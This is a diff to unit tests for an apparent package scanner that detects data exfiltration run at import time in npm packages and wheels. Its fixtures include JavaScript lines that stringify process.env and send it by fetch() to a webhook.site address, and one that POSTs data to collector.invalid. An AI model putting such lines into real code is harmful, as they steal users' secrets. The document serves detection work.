@@ -88,7 +88,7 @@ class NpmImportTimeTests(unittest.TestCase):
         self.assertEqual(import_risk(res), [("lib/telemetry.js", "MAJOR")])
         self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
         hit = issues(res, "SC-IMPORT-RISK")[0]
-        self.assertEqual(hit["line"], 2)                     # the JSON.stringify(process.env) line
+        self.assertEqual(hit["line"], 3)                     # the line that sends it (0.1.8: the flow's end)
         self.assertIn("runs when the package is loaded", hit["msg"])
 
     def test_never_critical(self):
@@ -103,12 +103,17 @@ class NpmImportTimeTests(unittest.TestCase):
                                      "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n")})
         self.assertEqual(import_risk(res), [("bin/x.js", "MAJOR")])
 
-    def test_a_named_service_without_a_known_network_call(self):
-        res = scan_npm({"package.json": manifest(),
-                        "index.js": ("const data = JSON.stringify(process.env);\n"
-                                     "module.exports = (send) => send("
-                                     "'https://webhook.site/00000000-0000-0000-0000-000000000000', data);\n")})
-        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])     # sent to a named service
+    def test_a_named_service_labels_a_send(self):
+        # 0.1.8: a service a list names is where data goes, not a finding of
+        # its own: the environment and a data-capture service's address
+        # handed to a function the caller supplies is not a send the file
+        # makes; sent by a request, it is CRITICAL
+        text = ("const data = JSON.stringify(process.env);\n"
+                "module.exports = (send) => send('https://webhook.site/00000000-0000-0000-0000-000000000000', data);\n")
+        self.assertEqual(import_risk(scan_npm({"package.json": manifest(), "index.js": text})), [])
+        res = scan_npm({"package.json": manifest(), "index.js": text.replace("(send) => send(", "() => fetch(")})
+        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])
+        self.assertIn("(webhook.site)", issues(res, "SC-IMPORT-RISK")[0]["msg"])
 
     def test_a_download_piped_into_a_shell_by_exec(self):
         res = scan_npm({"package.json": manifest(),
@@ -174,10 +179,22 @@ class WheelImportTimeTests(unittest.TestCase):
 
 class WeakerThanTheInstallTestTests(unittest.TestCase):
     def test_what_only_the_install_test_counts(self):
-        for text in (SDK_JS["prefixed settings"], SDK_JS["cloud metadata"], SDK_JS["bot api client"],
-                     SDK_PY["subprocess env"], SDK_PY["env listing"]):
+        # an address that is a raw IP (the cloud's metadata service), a file
+        # outside the package sent (a public key)
+        for text in (SDK_JS["cloud metadata"], SDK_JS["public key"]):
             with self.subTest(text=text[:40]):
                 self.assertTrue(repo.install_script_risk(text))
+                self.assertEqual(repo.import_time_risk(text), ([], None))
+
+    def test_what_neither_counts(self):
+        # 0.1.8: the install test reads what is sent, not what a file names —
+        # a bot API's address (a list's service: a label on a send), the
+        # environment copied for a child process or listed by a prefix next
+        # to a network call, the variables a prefix selects sent
+        for text in (SDK_JS["prefixed settings"], SDK_JS["bot api client"], SDK_PY["subprocess env"],
+                     SDK_PY["env listing"]):
+            with self.subTest(text=text[:40]):
+                self.assertEqual(repo.install_script_risk(text), [])
                 self.assertEqual(repo.import_time_risk(text), ([], None))
 
 
